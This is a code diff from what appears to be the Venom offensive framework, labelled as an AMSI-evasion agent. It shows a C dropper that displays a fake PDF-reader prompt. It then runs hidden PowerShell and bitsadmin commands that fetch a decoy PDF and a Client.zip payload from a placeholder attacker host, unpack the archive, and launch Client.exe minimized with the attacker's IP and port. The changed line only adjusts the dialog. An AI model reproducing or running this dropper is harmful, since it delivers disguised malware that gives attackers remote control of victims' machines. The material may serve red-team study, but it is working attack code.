@@ -13,7 +13,7 @@ Framework: Venom v1.0.17.4 - Amsi Evasion - Agent nº5
 
 int main()
 {
-   MessageBox(NULL, "Open Archive With PDF Reader?", "Portable Document Format (PDF)", MB_YESNO | MB_ICONQUESTION | MB_DEFBUTTON1);
+   MessageBox(NULL, "Open Archive With PDF Reader?", "Portable Document Format (PDF)", MB_YESNO | MB_ICONQUESTION | MB_DEFBUTTON1 | MB_SETFOREGROUND);
    _("powershell -w 1 -C bitsadmin /transfer purpleteam http://LhOsT/FiLNaMe.pdf FiNaL\\FiLNaMe.pdf && powershell Start-Process -windowstyle hidden -FilePath 'TempDir\\FiLNaMe.pdf'");
    _("powershell -w 1 -C bitsadmin /transfer ssaredteam http://LhOsT/Client.zip FiNaL\\Client.zip && powershell Expand-Archive -Force FiNaL\\Client.zip FiNaL");Sleep(1);
    _("cd TempDir && cmd.exe /R start /min Client.exe ip=LhOsT port=LpOrT");
